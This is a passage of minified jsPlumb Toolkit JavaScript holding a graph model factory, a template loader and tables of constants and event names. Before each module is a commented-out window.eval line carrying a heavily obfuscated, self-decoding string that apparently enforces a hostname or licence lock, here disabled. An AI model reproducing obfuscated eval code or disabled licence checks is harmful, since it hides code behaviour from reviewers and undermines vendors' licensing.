// window.eval(decodeURIComponent("window._j%3D~%5B%5D%3Bwindow._j%3D%7B___%3A%2B%2Bwindow._j%2C%24%24%24%24%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C__%24%3A%2B%2Bwindow._j%2C%24_%24_%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C_%24_%3A%2B%2Bwindow._j%2C%24_%24%24%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%24%3A(window._j%5Bwindow._j%5D%2B%22%22)%5Bwindow._j%5D%2C_%24%24%3A%2B%2Bwindow._j%2C%24%24%24_%3A(!%22%22%2B%22%22)%5Bwindow._j%5D%2C%24__%3A%2B%2Bwindow._j%2C%24_%24%3A%2B%2Bwindow._j%2C%24%24__%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%3A%2B%2Bwindow._j%2C%24%24%24%3A%2B%2Bwindow._j%2C%24___%3A%2B%2Bwindow._j%2C%24__%24%3A%2B%2Bwindow._j%7D%3Bwindow._j.%24_%3D(window._j.%24_%3Dwindow._j%2B%22%22)%5Bwindow._j.%24_%24%5D%2B(window._j._%24%3Dwindow._j.%24_%5Bwindow._j.__%24%5D)%2B(window._j.%24%24%3D(window._j.%24%2B%22%22)%5Bwindow._j.__%24%5D)%2B((!window._j)%2B%22%22)%5Bwindow._j._%24%24%5D%2B(window._j.__%3Dwindow._j.%24_%5Bwindow._j.%24%24_%5D)%2B(window._j.%24%3D(!%22%22%2B%22%22)%5Bwindow._j.__%24%5D)%2B(window._j._%3D(!%22%22%2B%22%22)%5Bwindow._j._%24_%5D)%2Bwindow._j.%24_%5Bwindow._j.%24_%24%5D%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j.%24%3Bwindow._j.%24%24%3Dwindow._j.%24%2B(!%22%22%2B%22%22)%5Bwindow._j._%24%24%5D%2Bwindow._j.__%2Bwindow._j._%2Bwindow._j.%24%2Bwindow._j.%24%24%3Bwindow._j.%24%3D(window._j.___)%5Bwindow._j.%24_%5D%5Bwindow._j.%24_%5D%3Bwindow._j.%24(window._j.%24(window._j.%24%24%2B%22%5C%22%22%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.%24%24%24%24%2B%22(%22%2Bwindow._j.%24%24_%24%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.__%2B%22.%22%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j.%24_%24_%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2B%22.%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24_%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22!%3D%3D'%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.___%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%24%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j._%24%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.__%2B%22.%22%2Bwindow._j.%24%24__%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2B%22')%22%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.___%2Bwindow._j.%24_%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22()%3B%22%2B%22%5C%22%22)())()%3B")),
function() {
    var a = this
      , b = a.jsPlumbToolkit
      , c = a.jsPlumbToolkitUtil
      , d = a.jsPlumbUtil;
    b.Model = function(a, e) {
        a = a || {},
        a.nodes = a.nodes || {},
        a.edges = a.edges || {},
        a.ports = a.ports || {},
        a.groups = a.groups || {};
        var f, g, h = {}, i = function(b) {
            var d = c.mergeWithParents([b, "default"], a.nodes);
            return delete d.parent,
            d
        }, j = function(b) {
            var d = c.mergeWithParents([b, "default"], a.edges);
            return delete d.parent,
            d
        }, k = function(b, d) {
            var e = d && d.ports ? c.mergeWithParents([b, "default"], d.ports) : c.mergeWithParents([b, "default"], a.ports);
            return delete e.parent,
            e
        }, l = function(b) {
            var d = c.mergeWithParents([b, "default"], a.groups);
            return delete d.parent,
            d
        };
        if ("undefined" != typeof e) {
            for (var m in a.edges) {
                if (f = j(m),
                f.overlays)
                    for (g = 0; g < f.overlays.length; g++)
                        if (d.isArray(f.overlays[g]) && f.overlays[g][1].events)
                            for (var n in f.overlays[g][1].events)
                                f.overlays[g][1].events[n] = function(a, b) {
                                    return function(c, d) {
                                        a.call(b, {
                                            overlay: c,
                                            e: d,
                                            component: c.component,
                                            edge: c.component.edge
                                        })
                                    }
                                }(f.overlays[g][1].events[n], f.overlays[g]);
                e.registerConnectionType(m, f)
            }
            for (g in a.ports)
                f = k(g),
                e.registerEndpointType(g, f);
            if (a.states)
                for (var o in a.states)
                    h[o] = new b.UIState(o,a.states[o],e)
        }
        return {
            getNodeDefinition: i,
            getEdgeDefinition: j,
            getPortDefinition: k,
            getGroupDefinition: l,
            getState: function(a) {
                return h[a]
            }
        }
    }
}
.call("undefined" != typeof window ? window : this),
// window.eval(decodeURIComponent("window._j%3D~%5B%5D%3Bwindow._j%3D%7B___%3A%2B%2Bwindow._j%2C%24%24%24%24%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C__%24%3A%2B%2Bwindow._j%2C%24_%24_%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C_%24_%3A%2B%2Bwindow._j%2C%24_%24%24%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%24%3A(window._j%5Bwindow._j%5D%2B%22%22)%5Bwindow._j%5D%2C_%24%24%3A%2B%2Bwindow._j%2C%24%24%24_%3A(!%22%22%2B%22%22)%5Bwindow._j%5D%2C%24__%3A%2B%2Bwindow._j%2C%24_%24%3A%2B%2Bwindow._j%2C%24%24__%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%3A%2B%2Bwindow._j%2C%24%24%24%3A%2B%2Bwindow._j%2C%24___%3A%2B%2Bwindow._j%2C%24__%24%3A%2B%2Bwindow._j%7D%3Bwindow._j.%24_%3D(window._j.%24_%3Dwindow._j%2B%22%22)%5Bwindow._j.%24_%24%5D%2B(window._j._%24%3Dwindow._j.%24_%5Bwindow._j.__%24%5D)%2B(window._j.%24%24%3D(window._j.%24%2B%22%22)%5Bwindow._j.__%24%5D)%2B((!window._j)%2B%22%22)%5Bwindow._j._%24%24%5D%2B(window._j.__%3Dwindow._j.%24_%5Bwindow._j.%24%24_%5D)%2B(window._j.%24%3D(!%22%22%2B%22%22)%5Bwindow._j.__%24%5D)%2B(window._j._%3D(!%22%22%2B%22%22)%5Bwindow._j._%24_%5D)%2Bwindow._j.%24_%5Bwindow._j.%24_%24%5D%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j.%24%3Bwindow._j.%24%24%3Dwindow._j.%24%2B(!%22%22%2B%22%22)%5Bwindow._j._%24%24%5D%2Bwindow._j.__%2Bwindow._j._%2Bwindow._j.%24%2Bwindow._j.%24%24%3Bwindow._j.%24%3D(window._j.___)%5Bwindow._j.%24_%5D%5Bwindow._j.%24_%5D%3Bwindow._j.%24(window._j.%24(window._j.%24%24%2B%22%5C%22%22%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.%24%24%24%24%2B%22(%22%2Bwindow._j.%24%24_%24%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.__%2B%22.%22%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j.%24_%24_%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2B%22.%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24_%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22!%3D%3D'%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.___%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%24%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j._%24%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.__%2B%22.%22%2Bwindow._j.%24%24__%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2B%22')%22%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.___%2Bwindow._j.%24_%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22()%3B%22%2B%22%5C%22%22)())()%3B")),
function() {
    var a = jsPlumbToolkit.ready
      , b = function(a) {
        var b = 0
          , c = function() {
            b--,
            b <= 0 && e()
        };
        this.add = function(d) {
            b++,
            jsPlumbToolkitUtil.ajax({
                url: d,
                success: function(b) {
                    var d = a.innerHTML;
                    d += b,
                    a.innerHTML = d,
                    c()
                },
                error: function(a) {
                    c()
                }
            })
        }
        ,
        this.ensureNotEmpty = function() {
            b <= 0 && e()
        }
    }
      , c = []
      , d = !1
      , e = function() {
        d = !0;
        for (var b = 0; b < c.length; b++)
            a.call(a, c[b])
    };
    jsPlumbToolkit.ready = function(b) {
        d ? a.call(a, b) : c.push(b)
    }
    ,
    jsPlumb.ready(function() {
        var a = document.getElementById("jsPlumbToolkitTemplates");
        if (a)
            e();
        else {
            a = document.createElement("div"),
            a.style.display = "none",
            a.id = "jsPlumbToolkitTemplates",
            document.body.appendChild(a);
            for (var c = new b(a), d = document.getElementsByTagName("script"), f = 0; f < d.length; f++) {
                var g = d[f].getAttribute("type")
                  , h = d[f].getAttribute("src");
                "text/x-jtk-templates" == g && c.add(h)
            }
            c.ensureNotEmpty()
        }
    })
}
.call("undefined" != typeof window ? window : this),
// window.eval(decodeURIComponent("window._j%3D~%5B%5D%3Bwindow._j%3D%7B___%3A%2B%2Bwindow._j%2C%24%24%24%24%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C__%24%3A%2B%2Bwindow._j%2C%24_%24_%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C_%24_%3A%2B%2Bwindow._j%2C%24_%24%24%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%24%3A(window._j%5Bwindow._j%5D%2B%22%22)%5Bwindow._j%5D%2C_%24%24%3A%2B%2Bwindow._j%2C%24%24%24_%3A(!%22%22%2B%22%22)%5Bwindow._j%5D%2C%24__%3A%2B%2Bwindow._j%2C%24_%24%3A%2B%2Bwindow._j%2C%24%24__%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%3A%2B%2Bwindow._j%2C%24%24%24%3A%2B%2Bwindow._j%2C%24___%3A%2B%2Bwindow._j%2C%24__%24%3A%2B%2Bwindow._j%7D%3Bwindow._j.%24_%3D(window._j.%24_%3Dwindow._j%2B%22%22)%5Bwindow._j.%24_%24%5D%2B(window._j._%24%3Dwindow._j.%24_%5Bwindow._j.__%24%5D)%2B(window._j.%24%24%3D(window._j.%24%2B%22%22)%5Bwindow._j.__%24%5D)%2B((!window._j)%2B%22%22)%5Bwindow._j._%24%24%5D%2B(window._j.__%3Dwindow._j.%24_%5Bwindow._j.%24%24_%5D)%2B(window._j.%24%3D(!%22%22%2B%22%22)%5Bwindow._j.__%24%5D)%2B(window._j._%3D(!%22%22%2B%22%22)%5Bwindow._j._%24_%5D)%2Bwindow._j.%24_%5Bwindow._j.%24_%24%5D%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j.%24%3Bwindow._j.%24%24%3Dwindow._j.%24%2B(!%22%22%2B%22%22)%5Bwindow._j._%24%24%5D%2Bwindow._j.__%2Bwindow._j._%2Bwindow._j.%24%2Bwindow._j.%24%24%3Bwindow._j.%24%3D(window._j.___)%5Bwindow._j.%24_%5D%5Bwindow._j.%24_%5D%3Bwindow._j.%24(window._j.%24(window._j.%24%24%2B%22%5C%22%22%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.%24%24%24%24%2B%22(%22%2Bwindow._j.%24%24_%24%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.__%2B%22.%22%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j.%24_%24_%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2B%22.%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24_%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22!%3D%3D'%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.___%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%24%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j._%24%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.__%2B%22.%22%2Bwindow._j.%24%24__%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2B%22')%22%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.___%2Bwindow._j.%24_%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22()%3B%22%2B%22%5C%22%22)())()%3B")),
function() {
    "use strict";
    this.jsPlumbToolkit.Classes = {
        LASSO: "jtk-lasso",
        LASSO_SELECT_DEFEAT: "jtk-lasso-select-defeat",
        MINIVIEW: "jtk-miniview",
        MINIVIEW_CANVAS: "jtk-miniview-canvas",
        MINIVIEW_PANNER: "jtk-miniview-panner",
        MINIVIEW_ELEMENT: "jtk-miniview-element",
        MINIVIEW_GROUP_ELEMENT: "jtk-miniview-group-element",
        MINIVIEW_PANNING: "jtk-miniview-panning",
        MINIVIEW_COLLAPSE: "jtk-miniview-collapse",
        MINIVIEW_COLLAPSED: "jtk-miniview-collapsed",
        NODE: "jtk-node",
        PORT: "jtk-port",
        GROUP: "jtk-group",
        SELECT_DEFEAT: "jtk-drag-select-defeat",
        SURFACE: "jtk-surface",
        SURFACE_NO_PAN: "jtk-surface-nopan",
        SURFACE_CANVAS: "jtk-surface-canvas",
        SURFACE_PAN: "jtk-surface-pan",
        SURFACE_PAN_LEFT: "jtk-surface-pan-left",
        SURFACE_PAN_TOP: "jtk-surface-pan-top",
        SURFACE_PAN_RIGHT: "jtk-surface-pan-right",
        SURFACE_PAN_BOTTOM: "jtk-surface-pan-bottom",
        SURFACE_PAN_ACTIVE: "jtk-surface-pan-active",
        SURFACE_SELECTED_ELEMENT: "jtk-surface-selected-element",
        SURFACE_SELECTED_CONNECTION: "jtk-surface-selected-connection",
        SURFACE_PANNING: "jtk-surface-panning",
        SURFACE_ELEMENT_DRAGGING: "jtk-surface-element-dragging",
        SURFACE_DROPPABLE_NODE: "jtk-surface-droppable-node",
        TOOLBAR: "jtk-toolbar",
        TOOLBAR_TOOL: "jtk-tool",
        TOOLBAR_TOOL_SELECTED: "jtk-tool-selected",
        TOOLBAR_TOOL_ICON: "jtk-tool-icon"
    },
    this.jsPlumbToolkit.Constants = {
        click: "click",
        start: "start",
        stop: "stop",
        drop: "drop",
        disabled: "disabled",
        pan: "pan",
        select: "select",
        drag: "drag",
        left: "left",
        right: "right",
        top: "top",
        bottom: "bottom",
        width: "width",
        height: "height",
        leftmin: "leftmin",
        leftmax: "leftmax",
        topmin: "topmin",
        topmax: "topmax",
        min: "min",
        max: "max",
        nominalSize: "50px",
        px: "px",
        onepx: "1px",
        nopx: "0px",
        em: "em",
        absolute: "absolute",
        relative: "relative",
        none: "none",
        block: "block",
        hidden: "hidden",
        div: "div",
        id: "id",
        plusEquals: "+=",
        minusEquals: "-=",
        dot: ".",
        transform: "transform",
        transformOrigin: "transform-origin",
        nodeType: "Node",
        portType: "Port",
        edgeType: "Edge",
        groupType: "Group",
        surfaceNodeDragScope: "surfaceNodeDrag",
        mistletoeLayoutType: "Mistletoe",
        surfaceType: "Surface",
        jtkStatePrefix: "jtk-state-",
        msgCannotSaveState: "Cannot save state",
        msgCannotRestoreState: "Cannot restore state"
    },
    this.jsPlumbToolkit.Attributes = {
        jtkNodeId: "jtk-node-id",
        relatedNodeId: "related-node-id"
    },
    this.jsPlumbToolkit.Methods = {
        addClass: "addClass",
        removeClass: "removeClass"
    },
    this.jsPlumbToolkit.Events = {
        beforeDrop: "beforeDrop",
        beforeDetach: "beforeDetach",
        click: "click",
        canvasClick: "canvasClick",
        canvasDblClick: "canvasDblClick",
        connection: "connection",
        connectionAborted: "connectionAborted",
        connectionDetached: "connectionDetached",
        connectionMoved: "connectionMoved",
        connectionDragStop: "connectionDragStop",
        contentDimensions: "contentDimensions",
        contextmenu: "contextmenu",
        dataLoadStart: "dataLoadStart",
        dataAppendStart: "dataAppendStart",
        dataLoadEnd: "dataLoadEnd",
        dataAppendEnd: "dataAppendEnd",
        dblclick: "dblclick",
        drag: "drag",
        drop: "drop",
        dragover: "dragover",
        dragend: "dragend",
        edgeAdded: "edgeAdded",
        edgeRemoved: "edgeRemoved",
        edgeTypeChanged: "edgeTypeChanged",
        elementDragged: "elementDragged",
        elementAdded: "elementAdded",
        elementRemoved: "elementRemoved",
        endOverlayAnimation: "endOverlayAnimation",
        graphClearStart: "graphClearStart",
        graphCleared: "graphCleared",
        groupAdded: "groupAdded",
        groupDragStop: "groupDragStop",
        groupExpand: "group:expand",
        groupCollapse: "group:collapse",
        groupRemoved: "groupRemoved",
        groupMemberAdded: "group:addMember",
        groupMemberRemoved: "group:removeMember",
        groupMoveEnd: "groupMoveEnd",
        groupUpdated: "groupUpdated",
        lassoEnd: "lasso:end",
        modeChanged: "modeChanged",
        mousedown: "mousedown",
        mousemove: "mousemove",
        mouseout: "mouseout",
        mouseup: "mouseup",
        mouseenter: "mouseenter",
        mouseleave: "mouseleave",
        mouseover: "mouseover",
        nodeAdded: "nodeAdded",
        nodeDropped: "nodeDropped",
        nodeMoveStart: "nodeMoveStart",
        nodeMoveEnd: "nodeMoveEnd",
        nodeRemoved: "nodeRemoved",
        edgeTarget: "edgeTarget",
        nodeTypeChanged: "nodeTypeChanged",
        edgeSource: "edgeSource",
        objectRepainted: "objectRepainted",
        pan: "pan",
        portAdded: "portAdded",
        portRemoved: "portRemoved",
        portTypeChanged: "portTypeChanged",
        redraw: "redraw",
        start: "start",
        startOverlayAnimation: "startOverlayAnimation",
        stateRestored: "stateRestored",
        stop: "stop",
        tap: "tap",
        touchend: "touchend",
        touchmove: "touchmove",
        touchstart: "touchstart",
        unload: "unload",
        portRefreshed: "portRefreshed",
        nodeRefreshed: "nodeRefreshed",
        edgeRefreshed: "edgeRefreshed",
        nodeRendered: "nodeRendered",
        nodeUpdated: "nodeUpdated",
        portUpdated: "portUpdated",
        edgeUpdated: "edgeUpdated",
        zoom: "zoom",
        relayout: "relayout",
        deselect: "deselect",
        selectionCleared: "selectionCleared",
        resize: "resize",
        anchorChanged: "anchorChanged"
    }
}
.call("undefined" != typeof window ? window : this),
// window.eval(decodeURIComponent("window._j%3D~%5B%5D%3Bwindow._j%3D%7B___%3A%2B%2Bwindow._j%2C%24%24%24%24%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C__%24%3A%2B%2Bwindow._j%2C%24_%24_%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C_%24_%3A%2B%2Bwindow._j%2C%24_%24%24%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%24%3A(window._j%5Bwindow._j%5D%2B%22%22)%5Bwindow._j%5D%2C_%24%24%3A%2B%2Bwindow._j%2C%24%24%24_%3A(!%22%22%2B%22%22)%5Bwindow._j%5D%2C%24__%3A%2B%2Bwindow._j%2C%24_%24%3A%2B%2Bwindow._j%2C%24%24__%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%3A%2B%2Bwindow._j%2C%24%24%24%3A%2B%2Bwindow._j%2C%24___%3A%2B%2Bwindow._j%2C%24__%24%3A%2B%2Bwindow._j%7D%3Bwindow._j.%24_%3D(window._j.%24_%3Dwindow._j%2B%22%22)%5Bwindow._j.%24_%24%5D%2B(window._j._%24%3Dwindow._j.%24_%5Bwindow._j.__%24%5D)%2B(window._j.%24%24%3D(window._j.%24%2B%22%22)%5Bwindow._j.__%24%5D)%2B((!window._j)%2B%22%22)%5Bwindow._j._%24%24%5D%2B(window._j.__%3Dwindow._j.%24_%5Bwindow._j.%24%24_%5D)%2B(window._j.%24%3D(!%22%22%2B%22%22)%5Bwindow._j.__%24%5D)%2B(window._j._%3D(!%22%22%2B%22%22)%5Bwindow._j._%24_%5D)%2Bwindow._j.%24_%5Bwindow._j.%24_%24%5D%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j.%24%3Bwindow._j.%24%24%3Dwindow._j.%24%2B(!%22%22%2B%22%22)%5Bwindow._j._%24%24%5D%2Bwindow._j.__%2Bwindow._j._%2Bwindow._j.%24%2Bwindow._j.%24%24%3Bwindow._j.%24%3D(window._j.___)%5Bwindow._j.%24_%5D%5Bwindow._j.%24_%5D%3Bwindow._j.%24(window._j.%24(window._j.%24%24%2B%22%5C%22%22%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.%24%24%24%24%2B%22(%22%2Bwindow._j.%24%24_%24%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.__%2B%22.%22%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j.%24_%24_%2Bwindo